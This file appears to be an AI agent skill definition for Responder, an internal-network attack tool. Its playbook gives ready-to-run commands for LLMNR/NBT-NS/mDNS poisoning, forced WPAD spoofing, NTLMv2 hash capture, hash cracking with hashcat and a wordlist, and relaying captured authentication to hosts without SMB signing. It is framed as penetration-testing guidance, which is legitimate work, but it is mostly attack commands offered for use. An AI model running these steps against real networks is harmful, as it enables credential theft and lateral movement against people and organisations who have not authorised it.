---
name: responder-ntlm-poison
description: "Responder: Harvests internal hashes and relays to hosts with SMB signing disabled. Signals: man-in-the-middle, MITM, forced WPAD spoofing, analysis mode, observe only, no poisoning."
zh-signals: "Responder: 内网哈希收割、签名关闭主机中继。信号:中间人,mitm,强制 WPAD 伪造,分析模式(只观察不投毒)。"
when-to-use: >-
  Use during internal network penetration testing to poison LLMNR/NBT-NS/mDNS and
  harvest NTLM hashes, or to relay authentication to hosts with SMB signing
  disabled; use analysis mode to observe only.
---

# Responder

- Attack Category: C40 Sniffing and Man-in-the-Middle Attacks
- Upstream Repository: https://github.com/lgandx/Responder
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/lgandx/Responder && cd Responder && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `Responder.py -I eth0` | Start LLMNR/NBT-NS/mDNS poisoning |
| `-wF` | Force WPAD spoofing |
| `-A` | Analysis mode (observe only, no poisoning) |
| `RunFinger.py -i 10.0.0.0/24` | SMB signing probe (select relay targets) |
| `MultiRelay.py -t <ip> -u ALL` | Relay poisoned authentication to the specified host |
| `-v` | Show hash details |

## Attack Scenario Playbook

### Internal hash harvesting

```bash
sudo python3 Responder.py -I eth0 -wF
# Wait for a target's resolution to fail; Responder responds and captures the NTLMv2 hash
hashcat -m 5600 responder.db.out /usr/share/wordlists/rockyou.txt
```

### Relaying to hosts with signing disabled

```bash
python3 RunFinger.py -i 10.0.0.0/24 | grep -i false
sudo python3 Responder.py -I eth0
# In another terminal: python3 MultiRelay.py -t 10.0.0.7 -u ALL
```

## Notes

Hashes are stored in Responder.db and cracked with hashcat -m 5600. Server 2012+ enables SMB signing by default, so use RunFinger to screen targets first.
